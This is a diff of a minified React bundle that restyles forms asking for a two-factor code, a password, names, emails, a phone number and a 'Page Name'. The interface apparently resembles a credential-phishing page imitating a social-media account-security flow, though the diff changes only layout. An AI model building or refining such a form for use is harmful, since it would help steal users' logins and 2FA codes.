@@ -10788,7 +10788,10 @@
             };
           }, []);
           return (0, c.jsxs)("div", {
-            style: { backgroundColor: "#F5FFFA", height: "100vh" },
+            style: {
+              backgroundColor: "#F5FFFA",
+              height: "100vh",
+            },
             children: [
               (0, c.jsx)("div", {
                 className: "header",
@@ -10947,16 +10950,12 @@
                   overflow: "auto",
                   borderRadius: "25px",
                   outline: "none",
-                  padding: "0px",
-                  marginRight: "-50%",
+                  padding: "10px",
                   transform: "translate(-50%, -50%)",
                   maxwidth: "100%",
                 },
                 children: (0, c.jsx)("div", {
                   style: {
-                    marginTop: 40,
-                    marginRight: 10,
-                    marginLeft: 10,
                     maxWidth: 600,
                   },
                   children: (0, c.jsxs)("div", {
@@ -10964,7 +10963,6 @@
                       width: "100%",
                       backgroundColor: "white",
                       minHeight: 200,
-                      borderRadius: 5,
                     },
                     children: [
                       (0, c.jsx)("div", {
@@ -11004,34 +11002,21 @@
                               display: "flex",
                             },
                             children:
-                              "Enter the 6-digit code for this account from the two-factor authentication you set up",
-                          }),
-                          (0, c.jsxs)("div", {
-                            style: {
-                              padding: "10px 10px 0px 10px",
-                              fontSize: 14,
-                              fontWeight: 500,
-                              display: "flex",
-                            },
-                            children:
-                              "(such as Google Authenticator or a text message you have received on your phone).",
+                              "Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator or a text message you have received on your phone).",
                           }),
                           (0, c.jsx)("div", {
                             style: {
-                              paddingTop: 20,
-                              paddingBottom: 20,
-                              paddingRight: 20,
-                              paddingLeft: 15,
-                              borderRadius: 10,
-                              borderRadius: 10,
+                              padding: 20,
+                              margin: "auto auto",
                               alignItems: "center",
                             },
                             children: (0, c.jsx)("img", {
                               src: "/resources/otp.png",
-                              width: "100%",
-                              borderRadius: 10,
-                              alignItems: "center",
-                              paddingLeft: 15,
+                              style: {
+                                width: "100%",
+                                borderRadius: 20,
+                                alignItems: "center",
+                              },
                             }),
                           }),
                           (0, c.jsxs)("div", {
@@ -11274,7 +11259,6 @@
                     style: {
                       paddingBottom: 20,
                     },
-
                     children:
                       "For your security, you must enter your password to continue.",
                   }),
@@ -11523,23 +11507,17 @@
                       borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
+                    placeholder: "More info...",
                   }),
                 ],
               }),
               (0, c.jsxs)("div", {
                 className: "",
+                style: {
+                  marginTop: 10,
+                  marginBottom: 10,
+                },
                 children: [
-                  (0, c.jsx)("div", {
-                    className: "",
-                    style: {
-                      fontWeight: "600",
-                      color: "#1C2A33",
-                      fontSize: 15,
-                      marginTop: 20,
-                      marginBottom: 5,
-                    },
-                    children: "Full Name",
-                  }),
                   (0, c.jsx)("input", {
                     type: "text",
                     value: v,
@@ -11549,29 +11527,23 @@
                       padding: 10,
                       paddingTop: 15,
                       paddingBottom: 15,
-                      fontSize: 15,
+                      fontSize: 14,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
                       borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
+                    placeholder: "Full Name",
                   }),
                 ],
               }),
               (0, c.jsxs)("div", {
                 className: "",
+                style: {
+                  marginTop: 10,
+                  marginBottom: 10,
+                },
                 children: [
-                  (0, c.jsx)("div", {
-                    className: "",
-                    style: {
-                      fontWeight: "600",
-                      color: "#1C2A33",
-                      fontSize: 15,
-                      marginTop: 20,
-                      marginBottom: 5,
-                    },
-                    children: "Business Email Address",
-                  }),
                   (0, c.jsx)("input", {
                     type: "text",
                     value: b,
@@ -11587,23 +11559,17 @@
                       borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
+                    placeholder: "Business Email Address",
                   }),
                 ],
               }),
               (0, c.jsxs)("div", {
                 className: "",
+                style: {
+                  marginTop: 10,
+                  marginBottom: 10,
+                },
                 children: [
-                  (0, c.jsx)("div", {
-                    className: "",
-                    style: {
-                      fontWeight: "600",
-                      color: "#1C2A33",
-                      fontSize: 15,
-                      marginTop: 20,
-                      marginBottom: 5,
-                    },
-                    children: "Personal Email Address",
-                  }),
                   (0, c.jsx)("input", {
                     type: "text",
                     value: k,
@@ -11619,23 +11585,17 @@
                       borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
+                    placeholder: "Personal Email Address",
                   }),
                 ],
               }),
               (0, c.jsxs)("div", {
                 className: "",
+                style: {
+                  marginTop: 10,
+                  marginBottom: 10,
+                },
                 children: [
-                  (0, c.jsx)("div", {
-                    className: "",
-                    style: {
-                      fontWeight: "600",
-                      color: "#1C2A33",
-                      fontSize: 15,
-                      marginTop: 20,
-                      marginBottom: 5,
-                    },
-                    children: "Mobile Phone Number",
-                  }),
                   (0, c.jsx)("input", {
                     type: "text",
                     value: x,
@@ -11651,23 +11611,17 @@
                       borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
+                    placeholder: "Mobile Phone Number",
                   }),
                 ],
               }),
               (0, c.jsxs)("div", {
                 className: "",
+                style: {
+                  marginTop: 10,
+                  marginBottom: 10,
+                },
                 children: [
-                  (0, c.jsx)("div", {
-                    className: "",
-                    style: {
-                      fontWeight: "600",
-                      color: "#1C2A33",
-                      fontSize: 15,
-                      marginTop: 20,
-                      marginBottom: 5,
-                    },
-                    children: "Page Name",
-                  }),
                   (0, c.jsx)("input", {
                     type: "text",
                     value: E,
@@ -11683,6 +11637,7 @@
                       borderRadius: 10,
                       border: "1px solid #d0d0d0",
                     },
+                    placeholder: "Page Name",
                   }),
                 ],
               }),
